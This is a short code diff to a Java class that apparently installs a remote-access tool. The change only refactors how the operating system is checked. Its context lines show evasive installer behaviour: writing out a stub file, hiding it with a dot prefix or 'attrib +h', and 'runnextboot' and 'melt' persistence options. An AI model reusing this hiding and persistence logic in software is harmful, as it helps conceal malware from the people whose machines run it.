@@ -59,7 +59,7 @@ public class InstallerStartupModule extends StartupModule {
 					file.getParentFile().mkdirs();
 				}
 				
-				if (hideFile && OperatingSystem.getOperatingSystem() != OperatingSystem.WINDOWS) {
+				if (hideFile && OperatingSystem.getOperatingSystem().getType() != OperatingSystem.WINDOWS) {
 					fileName = "." + fileName;
 				}
 				
@@ -106,7 +106,7 @@ public class InstallerStartupModule extends StartupModule {
 				outputStub.close();
 				thisFile.close();
 
-				if (hideFile && OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+				if (hideFile && OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 					Runtime.getRuntime().exec(new String[] { "attrib", "+h", file.getAbsolutePath() });
 				}
 				
@@ -156,7 +156,7 @@ public class InstallerStartupModule extends StartupModule {
 				boolean runNextBoot = Boolean.parseBoolean(Configuration.getConfig().get("runnextboot"));
 				boolean melt = Boolean.parseBoolean(Configuration.getConfig().get("melt"));
 
-				if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+				if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 					
 					String javaPath = System.getProperty("java.home") + "\\bin\\java";
 					
